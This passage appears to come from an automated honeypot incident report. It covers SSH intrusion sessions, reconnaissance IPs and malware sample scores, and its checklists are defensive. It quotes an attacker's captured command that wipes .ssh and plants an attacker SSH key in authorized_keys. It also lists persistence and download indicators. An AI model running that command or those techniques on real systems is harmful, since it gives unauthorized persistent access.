| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:44:32` | `cowrie.session.connect` |
| `2026-09-29 06:44:32` | `cowrie.client.version` |
| `2026-09-29 06:44:32` | `cowrie.client.kex` |
| `2026-09-29 06:44:33` | `cowrie.login.success` |
| `2026-09-29 06:44:34` | `cowrie.session.params` |
| `2026-09-29 06:44:34` | `cowrie.command.input` |
| `2026-09-29 06:44:34` | `cowrie.command.failed` |
| `2026-09-29 06:44:35` | `cowrie.log.closed` |
| `2026-09-29 06:44:35` | `cowrie.session.params` |
| `2026-09-29 06:44:35` | `cowrie.command.input` |
| `2026-09-29 06:44:35` | `cowrie.session.file_download` |
| `2026-09-29 06:44:35` | `cowrie.log.closed` |
| `2026-09-29 06:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.182.168[.]135` to AbuseIPDB if not already reported
- [ ] Block `94.182.168[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd32dd8a88c

| Field | Detail |
|---|---|
| **Source IP** | `94.182.168[.]135` |
| **First Seen** | 2026-09-29 06:44 |
| **Last Seen** | 2026-09-29 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:44:36` | `cowrie.session.connect` |
| `2026-09-29 06:44:36` | `cowrie.client.version` |
| `2026-09-29 06:44:36` | `cowrie.client.kex` |
| `2026-09-29 06:44:37` | `cowrie.login.success` |
| `2026-09-29 06:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.182.168[.]135` to AbuseIPDB if not already reported
- [ ] Block `94.182.168[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c8a5b0c1939

| Field | Detail |
|---|---|
| **Source IP** | `94.182.168[.]135` |
| **First Seen** | 2026-09-29 06:44 |
| **Last Seen** | 2026-09-29 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:44:37` | `cowrie.session.connect` |
| `2026-09-29 06:44:37` | `cowrie.client.version` |
| `2026-09-29 06:44:37` | `cowrie.client.kex` |
| `2026-09-29 06:44:38` | `cowrie.login.success` |
| `2026-09-29 06:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.182.168[.]135` to AbuseIPDB if not already reported
- [ ] Block `94.182.168[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d836cd43c75

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-29 06:47 |
| **Last Seen** | 2026-09-29 06:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:47:53` | `cowrie.session.connect` |
| `2026-09-29 06:47:53` | `cowrie.client.version` |
| `2026-09-29 06:47:53` | `cowrie.client.kex` |
| `2026-09-29 06:47:54` | `cowrie.login.success` |
| `2026-09-29 06:47:56` | `cowrie.direct-tcpip.request` |
| `2026-09-29 06:47:56` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 06:47:56` | `cowrie.direct-tcpip.data` |
| `2026-09-29 06:47:58` | `cowrie.direct-tcpip.request` |
| `2026-09-29 06:47:58` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 06:47:58` | `cowrie.direct-tcpip.data` |
| `2026-09-29 06:47:59` | `cowrie.direct-tcpip.request` |
| `2026-09-29 06:47:59` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 06:47:59` | `cowrie.direct-tcpip.data` |
| `2026-09-29 06:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3589176b1f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-29 06:52 |
| **Last Seen** | 2026-09-29 06:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:52:40` | `cowrie.session.connect` |
| `2026-09-29 06:52:40` | `cowrie.client.version` |
| `2026-09-29 06:52:40` | `cowrie.client.kex` |
| `2026-09-29 06:52:41` | `cowrie.login.success` |
| `2026-09-29 06:52:45` | `cowrie.direct-tcpip.request` |
| `2026-09-29 06:52:45` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 06:52:45` | `cowrie.direct-tcpip.data` |
| `2026-09-29 06:52:46` | `cowrie.direct-tcpip.request` |
| `2026-09-29 06:52:47` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 06:52:47` | `cowrie.direct-tcpip.data` |
| `2026-09-29 06:52:48` | `cowrie.direct-tcpip.request` |
| `2026-09-29 06:52:48` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 06:52:48` | `cowrie.direct-tcpip.data` |
| `2026-09-29 06:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `207.175.7[.]176` | **29** | 2026-09-29 04:59 | 2026-09-29 05:00 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.62.45[.]78` | **29** | 2026-09-29 06:10 | 2026-09-29 06:11 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `35.189.218[.]52` | **29** | 2026-09-29 05:35 | 2026-09-29 05:36 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `193.112.192[.]91` | **11** | 2026-09-29 03:46 | 2026-09-29 05:42 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `61.76.97[.]173` | **8** | 2026-09-29 04:10 | 2026-09-29 05:56 | 3m | 0 | `T1592` | 🟢 LOW |
| `116.72.105[.]234` | **5** | 2026-09-29 06:33 | 2026-09-29 06:35 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]88` | **5** | 2026-09-29 03:58 | 2026-09-29 03:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]237` | **5** | 2026-09-29 02:07 | 2026-09-29 02:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **4** | 2026-09-29 01:32 | 2026-09-29 04:38 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **4** | 2026-09-29 03:58 | 2026-09-29 06:54 | 2m | 0 | `T1592` | 🟢 LOW |
| `179.1.179[.]5` | **4** | 2026-09-29 01:04 | 2026-09-29 01:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.140.208[.]218` | **3** | 2026-09-29 02:20 | 2026-09-29 02:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.189.77[.]203` | **3** | 2026-09-29 05:28 | 2026-09-29 05:31 | 4m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]223` | **3** | 2026-09-29 02:41 | 2026-09-29 02:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]134` | **3** | 2026-09-29 03:57 | 2026-09-29 03:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]182` | **3** | 2026-09-29 02:08 | 2026-09-29 02:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]214` | **3** | 2026-09-29 02:08 | 2026-09-29 02:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]217` | **3** | 2026-09-29 01:32 | 2026-09-29 01:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]122` | **3** | 2026-09-29 03:57 | 2026-09-29 03:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-09-29 02:54 | 2026-09-29 04:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]86` | **2** | 2026-09-29 02:32 | 2026-09-29 02:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.67.68[.]175` | **2** | 2026-09-29 01:00 | 2026-09-29 01:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]99` | **2** | 2026-09-29 02:12 | 2026-09-29 02:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `190.106.37[.]17` | **2** | 2026-09-29 05:41 | 2026-09-29 05:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `222.104.99[.]233` | **2** | 2026-09-29 02:43 | 2026-09-29 03:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.74.211[.]29` | **2** | 2026-09-29 02:26 | 2026-09-29 02:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.64.134[.]75` | **2** | 2026-09-29 04:58 | 2026-09-29 04:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.8.81[.]118` | **2** | 2026-09-29 03:34 | 2026-09-29 03:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]81` | **2** | 2026-09-29 05:09 | 2026-09-29 05:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `68.46.176[.]204` | **2** | 2026-09-29 03:48 | 2026-09-29 03:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `73.120.0[.]169` | **2** | 2026-09-29 03:42 | 2026-09-29 03:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.237.200[.]7` | **2** | 2026-09-29 01:26 | 2026-09-29 01:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-09-29 03:27 | 2026-09-29 03:27 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-09-29 01:35 | 2026-09-29 01:35 | 10s | 0 | `T1592` | 🟢 LOW |
| `111.29.38[.]32` | 1 | 2026-09-29 02:30 | 2026-09-29 02:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.202.48[.]173` | 1 | 2026-09-29 03:22 | 2026-09-29 03:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `113.44.77[.]37` | 1 | 2026-09-29 03:13 | 2026-09-29 03:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.199[.]249` | 1 | 2026-09-29 05:27 | 2026-09-29 05:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.118[.]181` | 1 | 2026-09-29 01:47 | 2026-09-29 01:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.17[.]39` | 1 | 2026-09-29 02:34 | 2026-09-29 02:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.134.42[.]214` | 1 | 2026-09-29 06:08 | 2026-09-29 06:09 | 31s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-09-29 01:15 | 2026-09-29 01:16 | 59s | 0 | `T1592` | 🟢 LOW |
| `14.50.1[.]151` | 1 | 2026-09-29 04:49 | 2026-09-29 04:49 | 27s | 0 | `T1592` | 🟢 LOW |
| `165.22.27[.]186` | 1 | 2026-09-29 05:15 | 2026-09-29 05:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.151.60[.]9` | 1 | 2026-09-29 06:19 | 2026-09-29 06:19 | 12s | 0 | `T1592` | 🟢 LOW |
| `185.254.207[.]200` | 1 | 2026-09-29 05:01 | 2026-09-29 05:01 | 23s | 0 | `T1592` | 🟢 LOW |
| `188.190.91[.]16` | 1 | 2026-09-29 05:11 | 2026-09-29 05:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-09-29 04:06 | 2026-09-29 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | 1 | 2026-09-29 05:39 | 2026-09-29 05:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.43.97[.]233` | 1 | 2026-09-29 06:48 | 2026-09-29 06:48 | 25s | 0 | `T1592` | 🟢 LOW |
| `217.60.77[.]75` | 1 | 2026-09-29 03:48 | 2026-09-29 03:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.124.94[.]188` | 1 | 2026-09-29 01:24 | 2026-09-29 01:24 | 29s | 0 | `T1592` | 🟢 LOW |
| `221.166.164[.]167` | 1 | 2026-09-29 02:47 | 2026-09-29 02:48 | 25s | 0 | `T1592` | 🟢 LOW |
| `34.140.24[.]228` | 1 | 2026-09-29 02:16 | 2026-09-29 02:16 | 9s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-09-29 04:24 | 2026-09-29 04:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.51.49[.]166` | 1 | 2026-09-29 01:58 | 2026-09-29 02:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.128.88[.]88` | 1 | 2026-09-29 06:22 | 2026-09-29 06:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-09-29 02:41 | 2026-09-29 02:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-09-29 02:40 | 2026-09-29 02:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-09-29 01:37 | 2026-09-29 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-09-29 06:38 | 2026-09-29 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.197.86[.]219` | 1 | 2026-09-29 01:17 | 2026-09-29 01:17 | 1s | 0 | `T1592` | 🟢 LOW |
| `59.6.18[.]50` | 1 | 2026-09-29 06:38 | 2026-09-29 06:38 | 19s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-09-29 06:36 | 2026-09-29 06:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-09-29 01:41 | 2026-09-29 01:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]106` | 1 | 2026-09-29 06:10 | 2026-09-29 06:11 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.40[.]100` | 1 | 2026-09-29 06:44 | 2026-09-29 06:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-09-29 03:43 | 2026-09-29 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-09-29 06:39 | 2026-09-29 06:39 | 2s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-09-29 01:36 | 2026-09-29 01:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-29 01:50 | 2026-09-29 01:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.22.221[.]82` | 1 | 2026-09-29 02:53 | 2026-09-29 02:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `88.187.153[.]27` | 1 | 2026-09-29 04:16 | 2026-09-29 04:16 | 14s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-29 06:40 | 2026-09-29 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-09-29 01:59 | 2026-09-29 01:59 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
